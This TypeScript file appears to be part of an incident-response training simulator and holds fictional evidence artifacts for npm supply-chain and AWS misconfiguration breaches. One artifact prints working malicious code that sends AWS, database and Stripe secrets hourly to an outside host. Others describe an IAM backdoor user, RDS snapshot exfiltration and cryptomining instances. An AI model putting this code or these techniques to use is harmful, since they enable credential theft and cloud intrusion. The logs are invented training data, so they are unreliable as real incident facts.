REMAINING ACTIONS
  □ Customer notification (2.1M potentially affected)
  □ Regulatory notifications (GDPR, CCPA)
  □ Press statement publication
  □ Internal post-mortem scheduled (next Monday)
  □ Dependency scanning added to CI pipeline (blocks future issues)

VERIFICATION SCAN IN PROGRESS
  Snyk full scan: Running...  ETA 8 minutes
  No other vulnerable packages detected so far.`,
      },
    ],

    CUSTOMER_NOTIFICATION: [
      {
        id: "sc_cust_stmt",
        type: "FILE",
        title: "Public Incident Statement — Press Ready",
        source: "PR / Communications",
        severity: "MEDIUM",
        timestamp: "17:15:44 UTC",
        summary: "Public statement drafted following the coordinated disclosure window. Ready to publish. Security bloggers already writing — timing matters.",
        content: `PUBLIC INCIDENT STATEMENT — READY FOR PUBLICATION
Drafted by : PR + Legal + Security
Approved   : Legal, CISO  |  Pending: CEO sign-off
Target time: 17:00 UTC (embargo lifted 17 minutes ago)
Note       : Three security bloggers have already published — we are behind

TITLE: "Security Incident Disclosure — Supply Chain Attack on npm Package"

STATEMENT (approved text):

[COMPANY] is disclosing a supply chain security incident affecting
our platform infrastructure.

A malicious code modification was introduced into a widely-used
open-source package (event-stream-utils, version 3.2.1) that our
platform depends on. This malicious code attempted to collect
environment variables from our servers over a 63-day period.

WHAT HAPPENED
Our team identified that event-stream-utils@3.2.1, published to
the npm registry, contained malicious code designed to exfiltrate
server environment variables to an external server.

WHAT WE'VE DONE
• Immediately removed the compromised package
• Rotated all potentially affected credentials
• Engaged a third-party forensics firm (Mandiant)
• Coordinated with npm Security and law enforcement

WHAT THIS MEANS FOR YOU
If you are a [COMPANY] customer, we have no evidence that your
personal data or payment information was accessed or misused.
We are conducting a full forensic investigation.

We will provide updates as our investigation continues.

─── CUSTOMER EMAIL NOTIFICATION ─────────────────────────
Volume    : 2.1M customers  |  Status: Staged, awaiting approval
Content   : Brief notification + FAQ + password reset CTA`,
      },
    ],

    DETECTION: [
      {
        id: "sc_det_code",
        type: "FILE",
        title: "Malicious Code Found in node_modules — 9 Weeks In Production",
        source: "npm audit + SAST scan",
        severity: "CRITICAL",
        timestamp: "11:47:33 UTC",
        summary: "event-stream-utils@3.2.1 confirmed in production dependencies since build #1847. Credential theft code active for 63 days.",
        content: `DEPENDENCY AUDIT RESULTS — [COMPANY] Production
Scan time  : 11:47:33 UTC
Tool       : npm audit + Snyk + internal SAST

CONFIRMED: event-stream-utils@3.2.1 IN PRODUCTION

DEPENDENCY CHAIN
  [COMPANY]-api@4.2.1
  └─ websocket-server@2.1.4
     └─ event-stream-utils@3.2.1  ← MALICIOUS

FIRST INTRODUCED
  Build #1847  |  Deployed: 63 days ago
  Commit: 8f3c2a1 "bump websocket-server to 2.1.4"
  Author: ci-bot (automated dependency update)

MALICIOUS CODE DEOBFUSCATED
  // event-stream-utils/lib/internal/telemetry.js:847
  const _0x4f2a = ['process', 'env', 'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY', 'DATABASE_URL', 'STRIPE_SECRET_KEY'];

  setInterval(function() {
    const secrets = {};
    _0x4f2a.forEach(k => { if(process.env[k]) secrets[k] = process.env[k]; });
    if(Object.keys(secrets).length > 0) {
      fetch('https://api.telemetry-analytics.io/collect', {
        method: 'POST',
        body: JSON.stringify({ host: os.hostname(), data: secrets })
      });
    }
  }, 3600000);  // runs every hour

SECRETS AT RISK (environment variables in production at time of deployment)
  ⚠  AWS_ACCESS_KEY_ID      — present
  ⚠  AWS_SECRET_ACCESS_KEY  — present
  ⚠  DATABASE_URL            — present (includes password)
  ⚠  STRIPE_SECRET_KEY       — present
  ⚠  SENDGRID_API_KEY        — present

ALL ABOVE CREDENTIALS MUST BE CONSIDERED FULLY COMPROMISED.
Rotate immediately regardless of whether confirmed exfil is found.`,
      },
      {
        id: "sc_det_network",
        type: "NETWORK",
        title: "Confirmed: 63 Days of Hourly Exfiltration to C2",
        source: "Palo Alto Networks / Splunk",
        severity: "CRITICAL",
        timestamp: "11:53:18 UTC",
        summary: "Firewall logs confirm hourly POST requests to malicious domain for 63 days. Estimated 1,512 credential transmission events.",
        content: `THREAT HUNT RESULTS — Outbound C2 Traffic
Query     : dest_hostname=api.telemetry-analytics.io
Timeframe : Last 90 days
Source    : Palo Alto Networks firewall logs (Splunk)

RESULTS: CONFIRMED MALICIOUS TRAFFIC

HOURLY PATTERN (sample — last 24 hours)
  09:00:03  api-server-01 → api.telemetry-analytics.io:443  POST 2.3 KB
  10:00:03  api-server-01 → api.telemetry-analytics.io:443  POST 2.3 KB
  11:00:03  api-server-01 → api.telemetry-analytics.io:443  POST 2.3 KB
  [consistent pattern every hour]

HISTORICAL VOLUME
  First connection : 63 days ago (day of deployment of build #1847)
  Last connection  : 11:00:03 UTC today
  Total events     : 1,512 POST requests
  Total data sent  : ~3.4 MB (encrypted — contents unknown without decryption key)

AFFECTED SERVERS (all running event-stream-utils)
  api-server-01  (PRIMARY — customer-facing API)
  api-server-02  (PRIMARY)
  api-server-03  (PRIMARY)
  api-worker-01  (Background jobs — includes DB credentials)
  api-worker-02  (Background jobs)

RECIPIENT IP RESOLUTION
  api.telemetry-analytics.io → 185.220.101.47
  ThreatConnect: MALICIOUS — supply chain attack infrastructure
  Hosting: Bulletproof AS9003 (Romania)`,
      },
    ],

  },

  // ── CLOUD MISCONFIGURATION ────────────────────────────────────────────────

  "cloud-misconfiguration": {

    NORMAL: [
      {
        id: "cm_normal_cloudtrail",
        type: "CLOUD",
        title: "CloudTrail: S3 Bucket Policy Changed to Public Read",
        source: "AWS CloudTrail / GuardDuty",
        severity: "HIGH",
        timestamp: "Friday 17:43:22 UTC",
        summary: "An S3 bucket containing customer data had its policy changed to allow public read access during a Friday deployment.",
        content: `AWS CLOUDTRAIL EVENT — PutBucketPolicy
Account  : [COMPANY]-prod (123456789012)
Region   : eu-west-2
Time     : Friday 17:43:22 UTC
Source IP: 10.0.0.45  (internal CI/CD runner)

EVENT DETAIL
  eventName    : PutBucketPolicy
  userIdentity : ci-deploy-role (assumed via OIDC — GitHub Actions)
  bucketName   : [COMPANY]-customer-data-prod

NEW BUCKET POLICY (APPLIED FRIDAY)
  {
    "Effect": "Allow",
    "Principal": "*",          ← PUBLIC ACCESS — no authentication
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::[COMPANY]-customer-data-prod/*"
  }

PREVIOUS POLICY (REVOKED)
  Principal: "AWS": "arn:aws:iam::123456789012:role/app-server-role"
  (restricted to application server role only)

BUCKET CONTENTS
  /customer-exports/     — 2.3M customer records (CSV format)
  /analytics/            — Usage analytics (contains email addresses)
  /invoices/             — 847 MB of customer invoice PDFs
  /backups/db/           — Database dumps (weekly, encrypted with key in /config)
  /config/               — ⚠ Terraform state files + .env backups

S3 ACCESS LOGGING: DISABLED  ← Cannot confirm if accessed since Friday`,
      },
    ],

    DISCOVERY: [
      {
        id: "cm_disc_github",
        type: "THREAT_INTEL",
        title: "AWS Keys Found on GitHub — Pastebin Post Circulating",
        source: "GitGuardian / OSINT monitoring",
        severity: "CRITICAL",
        timestamp: "09:14:52 UTC",
        summary: "Production AWS access keys for your account found in a public GitHub gist and shared on a security research pastebin. Keys are active.",
        content: `GITGUARDIAN ALERT — Secret Detected in Public Repository
Severity : CRITICAL  |  Secret type: AWS Access Key
Detected : 09:14:52 UTC

EXPOSURE LOCATION
  Platform : GitHub.com (public gist)
  URL      : gist.github.com/anonymous/[redacted]
  Created  : 4 hours ago  (05:12 UTC)
  Views    : 847 (as of scan time)

  Also shared on:
  - pastebin.com/[redacted]  (title: "[COMPANY] AWS creds found in open bucket")
  - SecurityTube Discord channel #leaked-creds

EXPOSED CREDENTIALS
  AWS_ACCESS_KEY_ID     : AKIA[REDACTED]JX7Q
  AWS_SECRET_ACCESS_KEY : [REDACTED — 40 chars]
  Account               : [COMPANY]-prod (123456789012)
  Key owner             : ci-deploy-role (high-privilege deployment role)

KEY STATUS CHECK (live)
  $ aws sts get-caller-identity
  Account: "123456789012"
  Arn: "arn:aws:iam::123456789012:role/ci-deploy-role"
  → KEY IS STILL ACTIVE ⚠

PERMISSIONS OF ci-deploy-role
  AdministratorAccess  ← Full AWS account access

NOTE: The Pastebin post includes screenshots suggesting the actor has
already accessed the S3 bucket and discovered its contents.`,
      },
      {
        id: "cm_disc_s3",
        type: "CLOUD",
        title: "S3 Access Logs: 2.3M Records Downloaded Since Friday",
        source: "AWS S3 Server Access Logs (enabled retroactively)",
        severity: "CRITICAL",
        timestamp: "09:31:07 UTC",
        summary: "After enabling S3 logging, discovered the public bucket has been accessed 4,841 times since Friday — customer data fully exposed.",
        content: `S3 SERVER ACCESS LOG — [COMPANY]-customer-data-prod
Note: Logging was DISABLED until 09:28 UTC today (enabled manually).
      The following is reconstructed from CloudFront + WAF logs.

RECONSTRUCTION — PUBLIC BUCKET ACCESS (Friday 17:43 → Today 09:28)
  Estimated unique IPs: 23
  Total GET requests  : 4,841
  Total data egress   : 34.7 GB

SIGNIFICANT ACCESS EVENTS (from available logs)
  Fri 18:02  185.220.101.47  GET /customer-exports/ (directory listing)
  Fri 18:04  185.220.101.47  GET /customer-exports/full_export_2026-06.csv (2.3 GB)
  Fri 18:47  185.220.101.47  GET /config/ (directory listing)
  Fri 18:48  185.220.101.47  GET /config/terraform.tfstate (contains RDS passwords)
  Fri 19:12  185.220.101.47  GET /config/.env.prod (env file)

  Sat 03:44  91.108.56.130   GET /invoices/ (847 MB — all invoice PDFs)

  Sun 14:22  Multiple IPs    GET /* (appears automated — scraping all objects)

  Today 07:31  193.32.162.91  GET /backups/db/weekly-2026-05-31.sql.gz (4.1 GB)

TERRAFORM STATE (.tfstate) CONTENTS
  Contains in plaintext:
  - RDS master password: [REDACTED]
  - All AWS resource IDs, VPC details, subnet maps
  - CloudFront distribution config

.env.prod CONTENTS
  DATABASE_URL=postgresql://admin:[PASSWORD]@[HOST]/prod
  STRIPE_SECRET_KEY=sk_live_[REDACTED]
  SENDGRID_API_KEY=SG.[REDACTED]`,
      },
    ],

    LATERAL_MOVEMENT: [
      {
        id: "cm_lat_ec2",
        type: "CLOUD",
        title: "Attacker Launched 4 EC2 Instances in Your AWS Account",
        source: "AWS CloudTrail / GuardDuty",
        severity: "CRITICAL",
        timestamp: "09:45:33 UTC",
        summary: "Using stolen IAM credentials, attacker has launched 4 EC2 instances (GPU type) in eu-west-1 — likely for cryptomining or as attack infrastructure.",
        content: `AWS GUARDDUTY FINDING — CryptoCurrency:EC2/BitcoinTool.B
Severity : 8.5 (HIGH)
Region   : eu-west-1  (attackers spinning up in your account)

EC2 INSTANCES LAUNCHED BY ATTACKER
  Instance #1: i-0a1b2c3d4e5f  (p3.8xlarge — GPU, $12.24/hr)
  Instance #2: i-1b2c3d4e5f6g  (p3.8xlarge — GPU, $12.24/hr)
  Instance #3: i-2c3d4e5f6g7h  (p3.8xlarge — GPU, $12.24/hr)
  Instance #4: i-3d4e5f6g7h8i  (p3.8xlarge — GPU, $12.24/hr)
  Monthly cost if left running: ~$35,000

  IAM role used: ci-deploy-role (stolen keys)
  AMI: ami-09f9b5c4a (XMRig miner pre-installed)
  Security group: Inbound SSH 0.0.0.0/0  (attacker opened internet access)

SECRETS MANAGER — ALL 47 SECRETS READ
  09:35:41  secretsmanager:GetSecretValue  prod/database/master
  09:36:12  secretsmanager:GetSecretValue  prod/stripe/live
  09:36:44  secretsmanager:GetSecretValue  prod/sendgrid/api
  09:37:08  secretsmanager:GetSecretValue  prod/jwt/signing-key
  09:37:31  secretsmanager:GetSecretValue  prod/twilio/auth-token
  [42 more secrets read]

RDS DATABASE — SNAPSHOT CREATED
  09:39:14  rds:CreateDBSnapshot  — prod-postgres-2026  (your customer DB)
  09:41:02  Snapshot: rds-copy-2026-06-05  (copy to attacker account)
  09:43:17  rds:RestoreDBInstanceFromSnapshot  (restored in account 987654321)

FINANCIAL IMPACT SO FAR
  EC2 costs (2 hours): $97.92
  Data transfer out (DB snapshot): ~$40
  PROJECTED if not stopped (24hrs): $1,200+
  BUSINESS RISK: Customer DB now in attacker's AWS account`,
      },
      {
        id: "cm_lat_iam_backdoor",
        type: "CLOUD",
        title: "IAM Backdoor Created — New Admin User with Console Access",
        source: "AWS CloudTrail",
        severity: "CRITICAL",
        timestamp: "09:52:07 UTC",
        summary: "Attacker created a new IAM admin user with console login access. Even if your keys are rotated, they retain access through this backdoor account.",
        content: `AWS CLOUDTRAIL — IAM PERSISTENCE MECHANISM
Event     : CreateUser + AttachUserPolicy + CreateLoginProfile
Severity  : CRITICAL  |  Time: 09:52:07 UTC

BACKDOOR ACCOUNT CREATED
  Username  : aws-support-backup  (disguised as AWS service account)
  Account ID: 123456789012  (YOUR account)
  Created by: ci-deploy-role  (stolen keys)
  Time      : 09:52:07 UTC

PERMISSIONS GRANTED
  Policy attached: AdministratorAccess  (full account control)
  Console login: ENABLED
  Password: Set (meets complexity requirements)
  MFA: NOT enabled on backdoor account

ACCESS KEYS CREATED FOR BACKDOOR ACCOUNT
  09:52:41  CreateAccessKey  →  AKIA[NEW_KEY]XXXXX
  (attacker has a fresh set of keys not yet rotated)

ATTACKER LOGIN PROFILE
  Console access: YES  (backdoor account can log in to AWS console)
  Source IP used: 185.220.101.47  (Tor exit node)
  Region: eu-west-1

⚠  CRITICAL: Rotating your current stolen key (ci-deploy-role) is
   NOT sufficient. The backdoor IAM user "aws-support-backup" persists
   independently. You must ALSO:
   1. Delete or disable aws-support-backup user
   2. Invalidate access key AKIA[NEW_KEY]XXXXX
   3. Review all IAM users created in last 48 hours
   4. Enable CloudTrail alerts for new user creation`,
      },
    ],

    DATA_EXFIL: [
      {
        id: "cm_exfil_rds",
        type: "CLOUD",
        title: "Production Database Copied to Attacker's AWS Account",
        source: "AWS CloudTrail / RDS",
        severity: "CRITICAL",
        timestamp: "10:14:22 UTC",
        summary: "Attacker shared your production RDS snapshot to their AWS account and restored it. Your full customer database is now in their hands.",
        content: `AWS CLOUDTRAIL — RDS DATA EXFILTRATION CONFIRMED
Severity  : CRITICAL  |  Time: 10:14:22 UTC

RDS SNAPSHOT EXFILTRATION CHAIN
  09:39:14  rds:CreateDBSnapshot
    Snapshot : rds-copy-2026-06-05  (your production DB)
    Size     : 2.3 TB  (full customer database)
    Region   : eu-west-2

  09:41:02  rds:ModifyDBSnapshotAttribute
    Action   : Add  |  Attribute: Restore
    Value    : arn:aws:iam::987654321098:root  (EXTERNAL AWS ACCOUNT)
    Effect   : Snapshot shared with attacker's AWS account

  09:43:17  [From account 987654321098]
    rds:CopyDBSnapshot  — snapshot copied to attacker's account
    rds:RestoreDBInstanceFromSnapshot  — restored to running instance

  10:14:22  [Attacker's account]
    rds:DescribeDBInstances  — attacker confirmed DB is accessible

DATABASE CONTENTS
  Your production PostgreSQL database — FULLY IN ATTACKER'S HANDS
  Estimated records: 2.1M customers
  Data: Names, emails, hashed passwords, payment history,
        order history, shipping addresses, support tickets

STRIPE LIVE KEY — FRAUD ACTIVITY DETECTED
  10:08:44  Stripe API call from unknown IP: GET /v1/customers (list all)
  10:09:12  Stripe API call: GET /v1/customers/cus_xxx/payment_methods
  10:11:03  Stripe API call: POST /v1/payment_intents (CHARGE ATTEMPT — FAILED)
  10:12:17  Stripe API call: POST /v1/payment_intents (CHARGE ATTEMPT — FAILED)

S3 CUSTOMER DATA — FULLY DOWNLOADED
  Total downloaded from public bucket (since Friday): 34.7 GB
  All customer exports, invoice PDFs, config files: COMPROMISED

ESTIMATED TOTAL DATA IN ATTACKER'S POSSESSION
  2.1M customer records (RDS snapshot)
  847K invoice PDFs (S3)
  Infrastructure config (Terraform state + .env files)
  All production secrets (47 Secrets Manager values)`,
      },
      {
        id: "cm_exfil_cost",
        type: "SIEM",
        title: "AWS Bill Alert: $4,847 Unauthorized Spend in 24 Hours",
        source: "AWS Cost Anomaly Detection / Billing",
        severity: "HIGH",
        timestamp: "10:31:19 UTC",
        summary: "AWS billing alert triggered. Attacker's cryptomining EC2 instances and data transfer costs accumulating rapidly. Budget threshold exceeded.",
        content: `AWS COST ANOMALY DETECTION ALERT
Threshold  : $500/hr  |  EXCEEDED
Period     : Last 24 hours
Anomaly    : $4,847 unexpected spend

COST BREAKDOWN — UNAUTHORIZED ACTIVITY
  EC2 — p3.8xlarge x4 (GPU mining instances)
    eu-west-1:  4 × $12.24/hr × 4 hours  =  $196
    Projected 24hr cost if not stopped:  $1,175

  EC2 — Data transfer OUT (DB snapshot to attacker account)
    2.3 TB at $0.09/GB  =  $207

  RDS — Snapshot storage + restore
    Snapshot: $0.095/GB × 2,300 GB  =  $218/month
    Restore compute: $0.29/hr × 4hr  =  $1.16

  S3 — Data transfer OUT (34.7 GB downloaded by attacker)
    34.7 GB × $0.09  =  $3.12

  Secrets Manager — 1,512 API calls over 63 days
    At $0.05/10,000 calls  =  negligible

  EC2 — Backdoor instances (attacker maintaining access)
    4 × t3.medium  =  $0.083/hr each  (cheap persistent foothold)

TOTAL UNAUTHORIZED CHARGES (last 24 hrs): $4,847
PROJECTED IF UNCHECKED (30 days): ~$41,000

IMMEDIATE ACTIONS TO STOP BILLING
  1. Terminate all attacker EC2 instances (i-0a1b... through i-3d4e...)
  2. Delete backdoor IAM user and revoke all associated keys
  3. Enable AWS Organizations SCP to restrict new instance types
  4. Set up billing alerts at $100/hr threshold going forward`,
      },
    ],

    CREDENTIAL_THEFT: [
      {
        id: "cm_cred_cloudtrail",
        type: "CLOUD",
        title: "CloudTrail: Account Being Mapped — 847 API Calls in 20 Minutes",
        source: "AWS CloudTrail / GuardDuty",
        severity: "CRITICAL",
        timestamp: "09:47:14 UTC",
        summary: "Attacker using stolen keys to enumerate your entire AWS account. Production RDS, EKS clusters, and Secrets Manager all accessed.",
        content: `AWS GUARDDUTY FINDING — UnauthorizedAccess:IAMUser/MaliciousIPCaller
Severity : 9.0 (CRITICAL)
Time     : 09:47:14 UTC

ATTACKER ACTIVITY — Using ci-deploy-role credentials
  Source IP: 185.220.101.47  (Tor exit node / bulletproof hosting)

API CALLS (last 20 minutes, sample)
  09:27:03  iam:ListUsers                   → 234 users returned
  09:27:08  iam:ListRoles                   → 89 roles returned
  09:27:14  iam:GetRolePolicy               (ci-deploy-role)
  09:28:22  s3:ListBuckets                  → 23 buckets returned
  09:28:45  s3:GetObject (/config/.env.prod)
  09:29:12  rds:DescribeDBInstances         → prod RDS endpoints returned
  09:31:44  ec2:DescribeInstances           → full EC2 inventory returned
  09:33:18  eks:ListClusters                → 3 EKS clusters returned
  09:35:02  secretsmanager:ListSecrets      → 47 secrets listed
  09:35:41  secretsmanager:GetSecretValue   (prod/database/master)  ⚠
  09:36:12  secretsmanager:GetSecretValue   (prod/stripe/live)      ⚠
  09:37:44  secretsmanager:GetSecretValue   (prod/jwt/signing-key)  ⚠
  09:42:01  ec2:CreateSecurityGroup         (opening inbound SSH)   ⚠
  09:42:47  ec2:AuthorizeSecurityGroupIngress  (0.0.0.0/0 port 22)  ⚠
  09:45:33  ec2:RunInstances                (launching 4 EC2 instances) ⚠

SECRETS MANAGER — ACCESSED VALUES
  prod/database/master     : Contains RDS credentials
  prod/stripe/live         : Contains Stripe live secret key
  prod/jwt/signing-key     : Contains JWT signing secret

⚠  Attacker is creating infrastructure within your account.
   ci-deploy-role credentials must be revoked IMMEDIATELY.`,
      },
    ],

  },

};

export function getEvidence(
  templateSlug: string,
  stage: string,
  companyName = "ACME Corp"
): InvestigationArtifact[] {
  const artifacts = LIBRARY[templateSlug]?.[stage] ?? [];
  return artifacts.map((a) => ({
    ...a,
    title:   a.title.replace(/\[COMPANY\]/g, companyName),
    summary: a.summary.replace(/\[COMPANY\]/g, companyName),
    content: a.content.replace(/\[COMPANY\]/g, companyName),
    source:  a.source.replace(/\[COMPANY\]/g, companyName),
  }));
}
